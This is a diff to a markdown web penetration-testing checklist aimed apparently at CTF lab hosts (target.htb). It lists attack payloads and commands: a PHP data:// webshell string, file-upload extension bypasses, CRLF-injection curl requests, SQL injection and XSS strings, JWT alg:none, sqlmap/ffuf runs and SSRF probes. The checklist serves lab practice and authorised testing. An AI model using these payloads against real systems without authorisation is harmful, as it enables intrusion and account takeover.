@@ -46,7 +46,13 @@
       - [ ] `?page=php://filter/convert.base64-encode/resource=config`
       - [ ] `?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id`
     - [ ] Can you upload files?
+      - [ ] Restrictions on extension?
+      - [ ] Restrictions on size?
+      - [ ] Try double extension `.php.jpg`
+      - [ ] Try null byte `.php%00.jpg`
+      - [ ] Try space url encoding`.php%20.jpg`
       - [ ] Can you smuggle a phar and then trigger it with page? See `../infiltration/deserialisation-injection-insecure-deserialisation/php/php-phar-rfi-smuggling.md`
+      - [ ] See !FILE_UPLOAwD
   - [ ] Check `/index.php`
   - [ ] Check `/config.php`
   - [ ] Check `/settings.php`
@@ -102,13 +108,26 @@
     - gobuster recursive `gobuster dir -u http://target.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -r`
     - ZAP* preferred but takes a while to run
     - hakrawler `echo http://target.htb | hakrawler -d 3`
+- [ ] Can you upload files !FILE_UPLOAD?
+  - [ ] Restrictions on extension?
+  - [ ] Restrictions on size?
+  - [ ] Try double extension `.php.jpg`
+  - [ ] Try null byte `.php%00.jpg`
+  - [ ] Try space url encoding`.php%00.jpg`
+  - [ ] Scan for image magick vulnerabilities?
+    - [ ] CVE-2016-3714 (in progress...)
+    - [ ] CVE-2022-44268
+- [ ] Is there a place to insert an IP address?
+  - [ ] what happens if you use 127.0.0.1?
+  - [ ] what happens if you start nc and use your own IP address?
 - [ ] **SPA application?**
   - [ ] Download client source code
     - Browser DevTools > Sources tab > right-click folder > "Save as..."
     - wget mirror `wget -r -np -k http://target.htb/js/`
     - Use browser extension like "Download All Files" or manually save main bundles
-    - copy source `find ./src -type f \( -name '*.js' -o -name '*.html' -o -name '*.json' \) | xargs cat | pbcopy`
-      - then paste to LLM
+    - [ ] scan for vulnerabilities
+      - copy source `find ./src -type f \( -name '*.js' -o -name '*.html' -o -name '*.json' \) | xargs cat | pbcopy` then paste to LLM
+      - use semgrep to automatically scan source code for velnerabilities.
     - [ ] Hardcoded credentials `grep -r 'password\|apikey\|secret' *.js`
     - [ ] API endpoints `grep -r '/api/' *.js`
     - [ ] Comments with TODO/DEBUG
@@ -126,42 +145,41 @@
 
 # Exploitation
 
-## User
+## User Registration
 
-- [ ] **User**
-  - [ ] Registration?
-  - [ ] Create account
-    - [ ] User profile?
-    - [ ] Create post/article/modify web content?
-    - [ ] File upload functionality?
-      - [ ] Upload PHP shell? `.php`, `.php5`, `.phtml`, `.phar`
-      - [ ] Try double extension `.php.jpg`
-      - [ ] Try null byte `.php%00.jpg`
-    - [ ] **Authentication/Session**
-      - [ ] Check cookies - httpOnly? Secure? SameSite?
-      - [ ] JWT token? Decode at jwt.io, try `alg: none`, weak secret bruteforce
-      - [ ] Session fixation possible?
-      - [ ] Password reset token predictable?
-      - [ ] 2FA bypass? Rate limiting on codes?
-      - [ ] Default creds for detected tech? `creds.txt`, SecLists default creds
-  - [ ] Forgot password/way to list users?
-    - [ ] Username enumeration via timing/response difference
-    - [ ] ffuf usernames `ffuf -request forgot.req -request-proto http -w /usr/share/seclists/Usernames/Names/names.txt -fs <SIZE>`
-  - [ ] Default credentials? `admin:admin`, `admin:password`, etc.
-  - [ ] Timing attacks for user enumeration
-    - does valid user take longer time to outh than invalid one?
-    - ffuf `ffuf -u http://target.htb/login -X POST -d "username=FUZZ&password=test" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -o timing-results.json`
-  - [ ] CRLF injection? %0d%0aSet-Cookie:admin=true
-    - What it is: Carriage Return Line Feed injection - injecting newline characters (\r\n) to break out of one HTTP header and inject new ones.
-    - `curl -v "http://target.htb/redirect?url=/%0d%0aSet-Cookie:admin=true"`
-    - `curl -v "http://target.htb/page?name=test%0d%0aX-Injected-Header:pwned"`
-    - `curl -v "http://target.htb/login?next=/%0d%0aSet-Cookie:session=attacker_controlled_value"`
+- [ ] Registration?
+- [ ] Create account
+  - [ ] User profile?
+  - [ ] Create post/article/modify web content?
+  - [ ] File upload functionality?
+    - [ ] Upload PHP shell? `.php`, `.php5`, `.phtml`, `.phar`
+    - [ ] Try double extension `.php.jpg`
+    - [ ] Try null byte `.php%00.jpg`
+  - [ ] **Authentication/Session**
+    - [ ] Check cookies - httpOnly? Secure? SameSite?
+    - [ ] JWT token? Decode at jwt.io, try `alg: none`, weak secret bruteforce
+    - [ ] Session fixation possible?
+    - [ ] Password reset token predictable?
+    - [ ] 2FA bypass? Rate limiting on codes?
+    - [ ] Default creds for detected tech? `creds.txt`, SecLists default creds
+- [ ] Forgot password/way to list users?
+  - [ ] Username enumeration via timing/response difference
+  - [ ] ffuf usernames `ffuf -request forgot.req -request-proto http -w /usr/share/seclists/Usernames/Names/names.txt -fs <SIZE>`
+- [ ] Default credentials? `admin:admin`, `admin:password`, etc.
+- [ ] Timing attacks for user enumeration
+  - does valid user take longer time to outh than invalid one?
+  - ffuf `ffuf -u http://target.htb/login -X POST -d "username=FUZZ&password=test" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -o timing-results.json`
+- [ ] CRLF injection? %0d%0aSet-Cookie:admin=true
+  - What it is: Carriage Return Line Feed injection - injecting newline characters (\r\n) to break out of one HTTP header and inject new ones.
+  - `curl -v "http://target.htb/redirect?url=/%0d%0aSet-Cookie:admin=true"`
+  - `curl -v "http://target.htb/page?name=test%0d%0aX-Injected-Header:pwned"`
+  - `curl -v "http://target.htb/login?next=/%0d%0aSet-Cookie:session=attacker_controlled_value"`
 
 ## Forms
 
 - [ ] **Forms**
   - [ ] Any SSTI? `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `{{config}}`
-  - [ ] Any SQL Injection opportunities? `' OR 1=1-- -`, `admin' --`, test with sqlmap
+  - [ ] Any SQL Injection opportunities? `' OR 1=1--`, `admin' --`, test with sqlmap
     - sqlmap `sqlmap -r request.txt --batch --level=5 --risk=3`
   - [ ] Any AJAX captured in BurpSuite?
   - [ ] HTML escaping? `<script>alert(1)</script>` `<img src=x onerror=alert(1)>`
@@ -201,3 +219,8 @@
   - [ ] IDOR? Try changing IDs in requests
   - [ ] Any endpoint found?
     - Arjun (param discovery) `arjun -u http://target.htb/endpoint`
+- [ ] Possibility for SSRF?
+  - [ ] what if you change `Referer:` to the following:-
+    - [ ] `127.0.0.1`
+    - [ ] `(admin|dev|any-vhost-you-find).somebox.htb`
+    - [ ] `(admin|dev|any-vhost-you-find).somebox.htb/admin/login?redirect=/admin/` This one probably requires some work
